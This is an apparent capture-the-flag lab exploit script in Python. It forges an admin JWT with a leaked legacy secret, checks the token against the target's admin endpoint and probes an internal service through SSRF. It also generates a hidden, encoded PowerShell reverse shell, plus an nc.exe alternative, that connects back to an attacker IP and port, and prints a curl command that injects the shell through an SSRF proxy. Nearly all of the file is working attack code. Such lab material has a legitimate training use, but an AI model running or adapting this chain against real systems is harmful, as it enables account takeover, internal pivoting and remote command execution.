#!/usr/bin/env python3
"""
=============================================================================
ProShop CTF Lab — JWT Algorithm Confusion Exploit (Python)
lab-tools/forge_token.py

STAGE 3: Forge an admin JWT using the LEGACY_SECRET found in .env.bak
Works identically to forge_token.js but in Python using PyJWT.

Requirements:
    pip install PyJWT requests

Usage:
    python forge_token.py --admin-id <MONGO_OBJECTID> [--target http://localhost:5000]
    python forge_token.py --admin-id 64abc123def4560012345678 --verify
=============================================================================
"""

import jwt
import json
import base64
import argparse
import sys
import requests
from datetime import datetime, timedelta

# ─── Config ───────────────────────────────────────────────────────────────────
LEGACY_SECRET = "old-forgotten-secret-2024"   # From .env.bak (CWE-312)
DEFAULT_TARGET = "http://localhost:5000"

def forge_token(admin_id: str, secret: str = LEGACY_SECRET, expiry_days: int = 7) -> str:
    """Forge a JWT using HS256 signed with the legacy secret."""
    payload = {
        "userId": admin_id,
        "isAdmin": True,
        "iat": int(datetime.utcnow().timestamp()),
        "exp": int((datetime.utcnow() + timedelta(days=expiry_days)).timestamp()),
    }
    token = jwt.encode(payload, secret, algorithm="HS256")
    return token if isinstance(token, str) else token.decode()

def decode_token_parts(token: str) -> dict:
    """Decode token parts without verification."""
    parts = token.split(".")
    # Pad base64
    def pad(s): return s + "=" * (4 - len(s) % 4)
    header  = json.loads(base64.urlsafe_b64decode(pad(parts[0])))
    payload = json.loads(base64.urlsafe_b64decode(pad(parts[1])))
    return {"header": header, "payload": payload}

def verify_against_target(token: str, target: str) -> None:
    """Test the forged token against the live target."""
    print(f"\n[*] Testing forged token against {target} ...")
    try:
        # Test 1: admin dashboard
        r = requests.get(
            f"{target}/api/admin/dashboard",
            cookies={"jwt": token},
            timeout=8
        )
        print(f"  GET /api/admin/dashboard → {r.status_code}")
        if r.status_code == 200:
            print(f"  ✅ TOKEN ACCEPTED! Admin access confirmed.")
            print(f"  Response: {r.text[:200]}")
        else:
            print(f"  ❌ Token rejected. Response: {r.text[:200]}")

        # Test 2: SSRF probe to internal service
        print(f"\n[*] Probing internal service via SSRF ...")
        r2 = requests.post(
            f"{target}/api/admin/import-image",
            json={"imageUrl": "http://127.0.0.1:6000/status"},
            cookies={"jwt": token},
            timeout=10
        )
        print(f"  POST /api/admin/import-image → {r2.status_code}")
        if r2.status_code == 200:
            data = r2.json()
            print(f"  ✅ SSRF successful! Internal service response:")
            print(f"  {json.dumps(data, indent=2)[:500]}")
        else:
            print(f"  Response: {r2.text[:200]}")

    except requests.exceptions.ConnectionError:
        print(f"  ❌ Cannot connect to {target}. Is the server running?")

def build_rce_payload(lhost: str, lport: int, use_powershell: bool = True) -> str:
    """Build a Windows reverse shell payload for Stage 6."""
    if use_powershell:
        # PowerShell TCP reverse shell
        ps_cmd = (
            f"$c=New-Object Net.Sockets.TcpClient('{lhost}',{lport});"
            f"$s=$c.GetStream();"
            f"[byte[]]$b=0..65535|%{{0}};"
            f"while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
            f"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
            f"$r=(iex $d 2>&1|Out-String);"
            f"$e=[Text.Encoding]::ASCII.GetBytes($r+' PS> ');"
            f"$s.Write($e,0,$e.Length)}};"
            f"$c.Close()"
        )
        # Encode as UTF-16LE for -EncodedCommand
        b64 = base64.b64encode(ps_cmd.encode("utf-16-le")).decode()
        payload = (
            f"powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden "
            f"-ExecutionPolicy Bypass -EncodedCommand {b64}"
        )
        return payload
    else:
        # cmd.exe netcat-style (requires nc.exe on target)
        return f"cmd.exe /c nc.exe -e cmd.exe {lhost} {lport}"

def main():
    parser = argparse.ArgumentParser(
        description="ProShop CTF JWT Algorithm Confusion Exploit"
    )
    parser.add_argument("--admin-id", required=True, help="Admin MongoDB ObjectId")
    parser.add_argument("--secret", default=LEGACY_SECRET, help="Legacy HMAC secret")
    parser.add_argument("--target", default=DEFAULT_TARGET, help="Target base URL")
    parser.add_argument("--verify", action="store_true", help="Test token against live target")
    parser.add_argument("--rce", action="store_true", help="Generate RCE payload")
    parser.add_argument("--lhost", default="10.10.14.5", help="Attacker IP for reverse shell")
    parser.add_argument("--lport", type=int, default=4444, help="Attacker port for reverse shell")
    args = parser.parse_args()

    print("\n" + "=" * 70)
    print(" ProShop CTF Lab — JWT Algorithm Confusion (Python)")
    print("=" * 70)

    token = forge_token(args.admin_id, args.secret)
    parts = decode_token_parts(token)

    print(f"\n[+] Token Details:")
    print(f"    Algorithm : {parts['header']['alg']}")
    print(f"    Secret    : {args.secret}")
    print(f"    Payload   : {json.dumps(parts['payload'], indent=14)}")
    print(f"\n[+] Forged JWT:\n\n    {token}\n")

    print("[+] Cookie injection (DevTools):")
    print(f'    document.cookie = "jwt={token}; path=/"')
    print("\n[+] curl with forged token:")
    print(f'    curl -b "jwt={token}" {args.target}/api/admin/dashboard')

    if args.verify:
        verify_against_target(token, args.target)

    if args.rce:
        payload = build_rce_payload(args.lhost, args.lport, use_powershell=True)
        print(f"\n[+] Windows PowerShell Reverse Shell (LHOST={args.lhost} LPORT={args.lport}):")
        print(f"\n    {payload}\n")
        print("[+] Inject via SSRF → /plugin/exec:")
        print(f'    curl -b "jwt={token}" \\')
        print(f'      -X POST {args.target}/api/admin/internal-proxy \\')
        print(f"      -H 'Content-Type: application/json' \\")
        rce_body = json.dumps({
            "url": "http://127.0.0.1:6000/plugin/exec",
            "method": "POST",
            "body": {"cmd": payload, "usePs": True}
        })
        print(f"      -d '{rce_body}'")

    print("=" * 70 + "\n")

if __name__ == "__main__":
    main()
